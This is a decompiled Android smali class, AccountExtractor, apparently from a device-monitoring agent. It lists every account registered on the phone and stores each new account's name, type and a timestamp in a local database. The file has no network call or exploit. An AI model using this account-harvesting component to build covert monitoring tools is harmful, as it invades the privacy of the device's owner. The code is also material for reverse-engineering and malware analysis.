.class public Lcom/hp/vd/module/monitor/account/AccountExtractor;
.super Ljava/lang/Object;
.source "AccountExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "AccountExtractor"


# instance fields
.field protected accountBaseDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/AccountBaseData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected accountDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/AccountData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected context:Landroid/content/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;


# direct methods
.method public constructor <init>(Landroid/content/Context;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/AccountBaseData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/AccountData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 27
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->context:Landroid/content/Context;

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->accountBaseDao:Lcom/j256/ormlite/dao/Dao;

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->accountDao:Lcom/j256/ormlite/dao/Dao;

    .line 24
    iput-object v0, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 28
    iput-object p1, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->context:Landroid/content/Context;

    .line 30
    iput-object p2, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->accountBaseDao:Lcom/j256/ormlite/dao/Dao;

    .line 31
    iput-object p3, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->accountDao:Lcom/j256/ormlite/dao/Dao;

    .line 33
    iput-object p4, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method protected hasAccount(Landroid/accounts/Account;Ljava/util/List;)Z
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/accounts/Account;",
            "Ljava/util/List<",
            "Lcom/hp/vd/data/AccountBaseData;",
            ">;)Z"
        }
    .end annotation

    .line 115
    invoke-interface {p2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p2

    :cond_0
    invoke-interface {p2}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {p2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/hp/vd/data/AccountBaseData;

    .line 117
    iget-object v1, p1, Landroid/accounts/Account;->name:Ljava/lang/String;

    iget-object v2, v0, Lcom/hp/vd/data/AccountBaseData;->name:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    iget-object v1, p1, Landroid/accounts/Account;->type:Ljava/lang/String;

    iget-object v0, v0, Lcom/hp/vd/data/AccountBaseData;->type:Ljava/lang/String;

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 p1, 0x1

    return p1

    :cond_1
    const/4 p1, 0x0

    return p1
.end method

.method protected loadAccountBaseData(Lcom/j256/ormlite/dao/Dao;)Ljava/util/List;
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/AccountBaseData;",
            "Ljava/lang/Integer;",
            ">;)",
            "Ljava/util/List<",
            "Lcom/hp/vd/data/AccountBaseData;",
            ">;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    .line 110
    iget-object p1, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->accountBaseDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {p1}, Lcom/j256/ormlite/dao/Dao;->queryForAll()Ljava/util/List;

    move-result-object p1

    return-object p1
.end method

.method public run()V
    .locals 8

    .line 46
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->accountBaseDao:Lcom/j256/ormlite/dao/Dao;

    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/account/AccountExtractor;->loadAccountBaseData(Lcom/j256/ormlite/dao/Dao;)Ljava/util/List;

    move-result-object v0
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_1

    .line 64
    :try_start_1
    iget-object v1, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->context:Landroid/content/Context;

    invoke-static {v1}, Landroid/accounts/AccountManager;->get(Landroid/content/Context;)Landroid/accounts/AccountManager;

    move-result-object v1

    invoke-virtual {v1}, Landroid/accounts/AccountManager;->getAccounts()[Landroid/accounts/Account;

    move-result-object v1

    .line 66
    array-length v2, v1

    if-nez v2, :cond_0

    .line 67
    iget-object v0, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "AccountExtractor"

    const-string v2, "run(): no accounts"

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    .line 72
    :cond_0
    array-length v2, v1

    const/4 v3, 0x0

    :goto_0
    if-ge v3, v2, :cond_2

    aget-object v4, v1, v3

    .line 83
    invoke-virtual {p0, v4, v0}, Lcom/hp/vd/module/monitor/account/AccountExtractor;->hasAccount(Landroid/accounts/Account;Ljava/util/List;)Z

    move-result v5

    if-nez v5, :cond_1

    .line 84
    new-instance v5, Lcom/hp/vd/data/AccountData;

    invoke-direct {v5}, Lcom/hp/vd/data/AccountData;-><init>()V

    .line 85
    new-instance v6, Lcom/hp/vd/data/AccountBaseData;

    invoke-direct {v6}, Lcom/hp/vd/data/AccountBaseData;-><init>()V

    .line 87
    iget-object v7, v4, Landroid/accounts/Account;->name:Ljava/lang/String;

    iput-object v7, v6, Lcom/hp/vd/data/AccountBaseData;->name:Ljava/lang/String;

    .line 88
    iget-object v7, v4, Landroid/accounts/Account;->type:Ljava/lang/String;

    iput-object v7, v6, Lcom/hp/vd/data/AccountBaseData;->type:Ljava/lang/String;

    .line 90
    iget-object v7, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->accountBaseDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v7, v6}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 92
    iget-object v6, v4, Landroid/accounts/Account;->name:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/AccountData;->name:Ljava/lang/String;

    .line 93
    iget-object v4, v4, Landroid/accounts/Account;->type:Ljava/lang/String;

    iput-object v4, v5, Lcom/hp/vd/data/AccountData;->type:Ljava/lang/String;

    .line 94
    new-instance v4, Ljava/util/Date;

    invoke-direct {v4}, Ljava/util/Date;-><init>()V

    iput-object v4, v5, Lcom/hp/vd/data/AccountData;->createdAt:Ljava/util/Date;

    .line 96
    iget-object v4, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->accountDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v4, v5}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_0

    :cond_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_2
    return-void

    :catch_0
    move-exception v0

    .line 101
    iget-object v1, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "AccountExtractor"

    const-string v3, "Exception caught when saving data."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_1
    move-exception v0

    .line 54
    iget-object v1, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "AccountExtractor"

    const-string v3, "IllegalStateException caught while querying AccountBaseData"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_2
    move-exception v0

    .line 49
    iget-object v1, p0, Lcom/hp/vd/module/monitor/account/AccountExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "AccountExtractor"

    const-string v3, "SQLException caught while querying AccountBaseData."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
